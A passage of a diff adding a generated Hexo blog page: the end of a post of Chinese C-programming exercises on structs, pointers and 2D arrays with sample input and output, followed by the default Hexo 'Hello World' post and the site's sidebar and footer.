+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">31 15 7 3 1</span><br></pre></td></tr></table></figure>
+
+<h6 id="7编写一个-C-程序，定义一个名为-Buffer-的结构体，包含两个成员：一个字符指针-data-用于存储字符串，一个整型变量-length-用于存储字符串的长度。使用动态内存分配创建一个-Buffer-结构体，并通过用户输入初始化结构体的成员。然后编写一个函数，使用指针操作，将字符串中的所有小写字母转为大写字母，并输出转换后的字符串。"><a href="#7编写一个-C-程序，定义一个名为-Buffer-的结构体，包含两个成员：一个字符指针-data-用于存储字符串，一个整型变量-length-用于存储字符串的长度。使用动态内存分配创建一个-Buffer-结构体，并通过用户输入初始化结构体的成员。然后编写一个函数，使用指针操作，将字符串中的所有小写字母转为大写字母，并输出转换后的字符串。" class="headerlink" title="7编写一个 C 程序，定义一个名为 Buffer 的结构体，包含两个成员：一个字符指针 data 用于存储字符串，一个整型变量 length 用于存储字符串的长度。使用动态内存分配创建一个 Buffer 结构体，并通过用户输入初始化结构体的成员。然后编写一个函数，使用指针操作，将字符串中的所有小写字母转为大写字母，并输出转换后的字符串。"></a>7编写一个 C 程序，定义一个名为 <code>Buffer</code> 的结构体，包含两个成员：一个字符指针 <code>data</code> 用于存储字符串，一个整型变量 <code>length</code> 用于存储字符串的长度。使用动态内存分配创建一个 <code>Buffer</code> 结构体，并通过用户输入初始化结构体的成员。然后编写一个函数，使用指针操作，将字符串中的所有小写字母转为大写字母，并输出转换后的字符串。</h6><p>输入示例:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello world</span><br></pre></td></tr></table></figure>
+
+<p>输出示例:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HELLO WORLD</span><br></pre></td></tr></table></figure>
+
+<h4 id="8编写一个-C-程序，使用指针创建一个二维整型数组，并通过用户输入初始化数组的元素。然后计算并输出数组中所有元素的和。"><a href="#8编写一个-C-程序，使用指针创建一个二维整型数组，并通过用户输入初始化数组的元素。然后计算并输出数组中所有元素的和。" class="headerlink" title="8编写一个 C 程序，使用指针创建一个二维整型数组，并通过用户输入初始化数组的元素。然后计算并输出数组中所有元素的和。"></a>8编写一个 C 程序，使用指针创建一个二维整型数组，并通过用户输入初始化数组的元素。然后计算并输出数组中所有元素的和。</h4><p>输入示例:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">3 3</span><br><span class="line">1 2 3</span><br><span class="line">4 5 6</span><br><span class="line">7 8 9</span><br></pre></td></tr></table></figure>
+
+<p>输出示例:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">45</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://2023478.github.io/2024/03/26/C%E8%AF%AD%E8%A8%80%E9%A2%98%E7%9B%AE/" data-id="clu9qle6i00000g7zd5qfatn0" data-title="My New Post" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/03/26/hello-world/" class="article-date">
+  <time class="dt-published" datetime="2024-03-26T13:10:50.200Z" itemprop="datePublished">2024-03-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2024/03/26/hello-world/">Hello World</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://2023478.github.io/2024/03/26/hello-world/" data-id="clu9qle6k00010g7z6pj37qze" data-title="Hello World" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archiv</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">三月 2024</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">letzter Beitrag</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2024/03/27/%E5%8D%9A%E5%AE%A2/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2024/03/26/C%E8%AF%AD%E8%A8%80%E9%A2%98%E7%9B%AE/">My New Post</a>
+          </li>
+        
+          <li>
+            <a href="/2024/03/26/hello-world/">Hello World</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2024 wgiegie<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
